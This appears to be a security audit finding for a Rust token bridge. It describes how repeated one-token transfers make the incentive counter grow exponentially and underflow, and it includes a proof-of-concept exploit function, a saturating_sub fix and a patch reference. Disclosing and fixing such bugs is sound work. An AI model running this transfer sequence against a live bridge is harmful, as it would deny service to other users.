## Integer Overflow Vulnerability in Token Transfer Incentives

There is a potential for integer overflow in the mechanism for calculating incentives for token transfers. The code tracks an `incentive_counter`, representing the cumulative incentives earned, and checks whether this cumulative amount exceeds a configured `incentive_threshold`. If it does, a new incentive epoch begins, and the incentives adjust accordingly.

## Code Snippet

```rust
let threshold = b.incentive_threshold;
let inc = b.incentive_counter + transfer.amount;
if inc >= threshold {
    // count towards the future epoch
    if inc - threshold > threshold - b.incentive_counter {
        epoch += 1;
    }
    b.incentive_counter = inc - threshold;
    b.incentive_epoch += 1;
} else {
    b.incentive_counter += inc;
}
```

However, there is no check in place to ensure that the value of `b.incentive_counter` is less than or equal to `threshold`. From an attacker’s standpoint, the exponential increase in `b.incentive_counter` makes the attack feasible. An attacker only needs to send `log2(threshold)` RNDR tokens, split into one token per transfer.

### Proof Of Concept

This simulated exploit demonstrates the vulnerability by initializing a bridge with an arbitrary threshold and sequentially processing `log2(b.incentive_threshold)` transactions crafted by the attacker, each transferring a single token. This sequence deliberately pushes the bridge into the undesirable state, verified by the assertion:

```rust
assert!(b.incentive_counter > b.incentive_threshold);
```

#### Exploit Code

```rust
fn exploit() {
    let incentive_threshold = 100_000;
    let mut b = BridgeV1 {
        incentive_epoch: 0,
        incentive_counter: 0,
        incentive_threshold,
        ..Default::default()
    };

    for i in 0..=(incentive_threshold as f64).log2() as u64 {
        // transfer_amount is always <= incentive_threshold
        let transfer_amount: u64 = 1;
        let mut epoch = b.incentive_epoch;
        let threshold = b.incentive_threshold;
        let inc = b.incentive_counter + transfer_amount;
        println!(
            "{}[{}] epoch={} threshold={}. b.incentive_counter={} + transfer.amount={} ---> inc={}",
            i, inc >= threshold, epoch, threshold, b.incentive_counter, transfer_amount, inc
        );
        if inc >= threshold {
            // count towards the future epoch
            if inc - threshold > threshold - (b.incentive_counter) {
                epoch += 1;
            }
            b.incentive_counter = inc - threshold;
            b.incentive_epoch += 1;
        } else {
            b.incentive_counter += inc;
        }
    }
    assert!(b.incentive_counter > b.incentive_threshold);
}
```

## Remediation

Utilize `saturating_sub` to avoid the denial of service while keeping the original functionality.

### Suggested Code Change

```diff
if inc >= threshold {
    // count towards the future epoch
-   if inc - threshold > threshold - b.incentive_counter {
+   if inc - threshold > threshold.saturating_sub(b.incentive_counter) {
        epoch += 1;
    }
}
```

## Patch

Fixed in commit `99d40b7`.
